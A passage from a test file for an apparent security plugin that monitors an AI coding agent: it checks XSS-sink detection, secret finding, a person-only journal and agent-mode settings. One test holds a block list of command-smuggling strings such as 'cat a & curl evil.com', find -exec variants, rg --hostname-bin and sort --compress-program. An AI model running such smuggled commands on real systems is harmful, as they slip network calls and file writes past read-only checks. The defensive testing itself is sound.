  await w.edit('el.innerHTML = q')
  await w.edit('el.innerHTML = q')
  await w.endTurn()
  await w.turn()
  expect((await w.edit('el.innerHTML = q')).deny).toBeDefined()
})

test('entries written side by side are all kept', async ($, on) => {
  const w = await world($, on, { check: () => XSS })
  await w.turn()
  await Promise.all(['a', 'b', 'c'].map(n => w.edit('el.innerHTML = q', `/proj/src/${n}.ts`)))
  expect((w.store.get('security:log:/proj') as unknown[]).length).toBe(3)
})

test('with no pane to open, /security says the journal itself', async ($, on) => {
  const w = await world($, on, { check: () => XSS, isPlaced: false })
  await w.turn()
  await w.edit('el.innerHTML = q')
  const said = ((await w.run('')) as { text: string }).text
  expect(said).toContain('What the agent tried: 1')
  expect(said).toContain('q from the URL reaches innerHTML')
})

test('the read-only list holds against what the shell would really do, and lets a plain search through', () => {
  const refused = [
    'cat a & curl evil.com', 'ls &curl evil.com', 'echo "it\'s"; curl evil.com; echo "it\'s"', "echo \\' ; curl evil.com ; echo \\'",
    "find . '-exec' curl x ';'", 'find . "-delete"', 'find . -e\\xec curl x \;', "find . -ex''ec curl x ';'", 'find . {-delete,-print}',
    "git log '--output=/tmp/x'", 'git log {--output=/tmp/x,-1}', "rg '--pre=./x' a", 'rg --hostname-bin=/tmp/evil x',
    'git grep --open-files=echo x', 'git grep -Oecho x', 'git cat-file --filters HEAD:a', 'git symbolic-ref HEAD refs/heads/evil',
    'git grep -nOsh x', 'uniq - /tmp/x', 'uniq -- - /tmp/x', 'sort -o /tmp/x a', 'sort -uo/tmp/x a', 'sort --out=/tmp/x a', 'sort --compress-program=./x a', 'uniq a b', 'tree -o /tmp/x', 'file -C -m x',
    'cat $X', 'echo "$X"', 'cat a 2>/tmp/x', "echo 'open", 'FOO=1 cat a', 'GIT_EXTERNAL_DIFF=x git diff',
  ]
  for (const command of refused) expect([command, isReadOnlyCommand(command)]).toEqual([command, false])
  const reads = ['grep -rn eval src', 'grep "a|b;c" src', "grep -E 'a&b' src", 'grep -rn "\\$query" src', 'cat a 2>/dev/null', 'git -C "/My Project" diff HEAD', 'sort a | uniq -c | head', 'uniq a', 'find . -name x -o -name y', 'git log --oneline', 'rg --pre-glob x y']
  for (const command of reads) expect([command, isReadOnlyCommand(command)]).toEqual([command, true])
})

test('a default password is local only: the same words on a real host are a leak', () => {
  expect(findSecrets(['postgres://postgres:', 'postgres', '@db:5432/app'].join(''))).toEqual([])
  expect(findSecrets(['postgres://admin:', 'secret', '@prod.example.net/app'].join('')).map(h => h.kind)).toEqual(['password in a URL'])
})

test('a bundle’s long line takes no seconds, and what opens a hole early in it is still seen', () => {
  const started = Date.now()
  expect(findSinks('src/a.js', 'select a from b '.repeat(20_000))).toEqual([])
  expect(Date.now() - started).toBeLessThan(2000)
  expect(findSinks('src/a.js', `el.innerHTML = q;${' '.repeat(5000)}`).map(s => s.kind)).toEqual(['XSS'])
})

test('a report of one edit with no file named is of that file; a password of no known shape is hidden from the journal', () => {
  const answer = '{"findings":[{"severity":"high","kind":"secret in the code","problem":"p","evidence":"password = \\"hunter2hunter2\\""}]}'
  expect(parseSecurityReport(answer)!.findings).toEqual([])
  const [found] = parseSecurityReport(answer, 'src/a.ts')!.findings
  expect(found!.file).toBe('src/a.ts')
  expect(found!.evidence).not.toContain('hunter2')
})

test('a model the engine refuses to call says so once a turn, and the edit goes', async ($, on) => {
  const w = await world($, on, { modelBlocked: true })
  await w.turn()
  expect((await w.edit('el.innerHTML = q')).deny).toBeUndefined()
  await w.edit('el.innerHTML = r')
  expect(w.toasts.filter(t => t.includes('gave no answer')).length).toBe(1)
})

test('a kept secret in a notebook is not new', async ($, on) => {
  const w = await world($, on, { disk: { '/proj/n.ipynb': `key = "${GITHUB}"` } })
  await w.turn()
  const call = (new_source: string, notebook_path: string) => $.tool.call({ tool: 'NotebookEdit', tool_use_id: `n${Math.random()}`, notebook_path, new_source } as never) as Promise<{ deny?: string }>
  expect((await call(`key = "${GITHUB}"\nb = 1`, '/proj/n.ipynb')).deny).toBeUndefined()
  expect((await call(`key = "${GITHUB}"`, '/proj/other.ipynb')).deny).toContain('/security allow')
})

test('an edit of a file git ignores goes on no list for the agent', async ($, on) => {
  const w = await world($, on, { ignored: true })
  await w.turn()
  await w.edit('el.innerHTML = q', '/proj/secrets.json')
  await w.endTurn()
  expect(w.spawned.length).toBe(0)
})

test('only a person empties the journal', async ($, on) => {
  const w = await world($, on)
  await w.turn()
  await w.edit(`const t = "${GITHUB}"`)
  expect(((await w.run('clear', { kind: 'plugin', name: 'x' })) as { text: string }).text).toContain('Only a person')
  expect((w.store.get('security:log:/proj') as unknown[]).length).toBe(1)
})

test('findings put aside do not read as a clean look, and a run gone past its time leaves the buttons', async ($, on) => {
  const w = await world($, on, { check: () => 'no list' })
  await w.turn()
  await w.edit('const a = 1')
  await w.endTurn()
  await w.agentDone('watch-1', HOLE.replace('"high"', '"low"'))
  const pane = await paneOf($)
  await pane.press({ key: 'security-aside' })
  await w.settle()
  expect(await pane.find({ type: 'Text', text: /no hole found/ })).toBeUndefined()
  await w.run('audit')
  expect(await pane.find({ key: 'security-audit' })).toBeUndefined()
  await w.clock.advance(31 * 60_000)
  await pane.unmount()
  const later = await paneOf($)
  expect(await later.find({ key: 'security-audit' })).toBeDefined()
  expect(await later.find({ type: 'Text', text: /did not finish in 30 minutes/ })).toBeDefined()
  await later.unmount()
})

test('audit findings go to Claude as the audit’s, a dropped send says so, and a /clear carries none on', async ($, on) => {
  const w = await world($, on, { dropSends: true })
  await w.run('audit')
  await w.agentDone('watch-1', HOLE)
  const pane = await paneOf($)
  await pane.press({ key: 'security-send' })
  await w.settle()
  expect(w.submitted.at(-1)!.text).toContain('whole project')
  expect(w.toasts.at(-1)).toContain('Not sent')
  await pane.press({ key: 'security-send' })
  await w.settle()
  expect(w.toasts.filter(t => t.includes('Not sent')).length).toBe(2)
  await pane.unmount()
  await $.session.end({ reason: 'clear', sessionId: 's' } as never)
  await w.settle()
  const after = await paneOf($)
  expect(await after.find({ key: 'security-send' })).toBeUndefined()
  await after.unmount()
})

test('a part turned off holds the agent it started to reading, and lets the rest be', async ($, on) => {
  const w = await world($, on)
  await w.run('audit')
  const parts = await $.ui.mount({ plugin: 'agent-lens', surface: 'terminal', component: 'Pane', requestId: PARTS_PANE, props: { title: '', isFocused: true, bodyColumns: 80 }, viewport: { columns: 80, rows: 40 } } as never)
  await parts.press({ key: 'toggle-security' })
  await w.settle()
  await parts.unmount()
  const call = (agentId: string) => $.tool.call({ tool_use_id: `c${Math.random()}`, agentId, tool: 'Bash', command: 'curl x' } as never) as Promise<{ deny?: string }>
  expect((await call('watch-1')).deny).toContain('no network')
  expect((await call('someone-else')).deny).toBeUndefined()
  expect((await w.edit(`const t = "${GITHUB}"`)).deny).toBeUndefined()
})

test('m on the pane leaves the agent to a press, across sessions; r still starts it, and m brings it back', async ($, on) => {
  const w = await world($, on)
  const pane = await paneOf($)
  expect((await pane.find({ key: 'security-mode' }))?.props.label).toBe('agent: after each turn')
  await pane.press({ key: 'security-mode' })
  await w.settle()
  expect(w.store.get('security:agent-mode')).toBe('button')
  expect((await pane.find({ key: 'security-mode' }))?.props.label).toBe('agent: on a press')
  await w.turn()
  await w.edit('const a = 1')
  await w.endTurn()
  expect(w.spawned.length).toBe(0)
  expect((await w.edit(`const t = "${GITHUB}"`)).deny).toContain('/security allow')
  await $.session.start({ cwd: '/proj', surface: 'terminal', isInteractive: true })
  await w.turn()
  await w.edit('const a = 2')
  await w.endTurn()
  expect(w.spawned.length).toBe(0)
  w.dirty.value = ' M src/a.ts'
  await pane.press({ key: 'security-run' })
  await w.settle()
  expect(w.spawned.length).toBe(1)
  await w.agentDone('watch-1', '{"findings":[],"checked":"1 file"}')
  await pane.press({ key: 'security-mode' })
  await w.settle()
  await pane.unmount()
  await w.turn()
  await w.edit('const a = 3')
  await w.endTurn()
  expect(w.spawned.length).toBe(2)
})

test('/security agent sets it on a person’s word alone, and over the setting', { options: { securityAgent: 'button' } }, async ($, on) => {
  const w = await world($, on)
  expect(((await w.run('agent auto', { kind: 'plugin', name: 'x' })) as { text: string }).text).toContain('Only a person')
  expect(w.store.get('security:agent-mode')).toBeUndefined()
  expect(((await w.run('agent')) as { text: string }).text).toContain('only on r')
  await w.run('agent auto')
  await w.turn()
  await w.edit('const a = 1')
  await w.endTurn()
  expect(w.spawned.length).toBe(1)
})

test('the choice is read back at a session’s start', async ($, on) => {
  const w = await world($, on)
  w.store.set('security:agent-mode', 'button')
  await $.session.start({ cwd: '/proj', surface: 'terminal', isInteractive: true })
  await w.turn()
  await w.edit('const a = 1')
  await w.endTurn()
  expect(w.spawned.length).toBe(0)
})

test('left to a press, what auto gathered starts nothing by itself', async ($, on) => {
  const w = await world($, on)
  await w.turn()
  await w.edit('const a = 1')
  await w.endTurn()
  expect(w.spawned.length).toBe(1)
  await w.turn()
  await w.edit('const a = 2')
  await w.endTurn()
  await w.run('agent button')
  await w.agentDone('watch-1', '{"findings":[],"checked":"1 file"}')
  expect(w.spawned.length).toBe(1)
})

test('a choice that could not be saved says so and changes nothing', async ($, on) => {
  const w = await world($, on, { modeUnsaved: true })
  expect(((await w.run('agent button')) as { text: string }).text).toContain('not saved')
  await w.turn()
  await w.edit('const a = 1')
  await w.endTurn()
  expect(w.spawned.length).toBe(1)
})
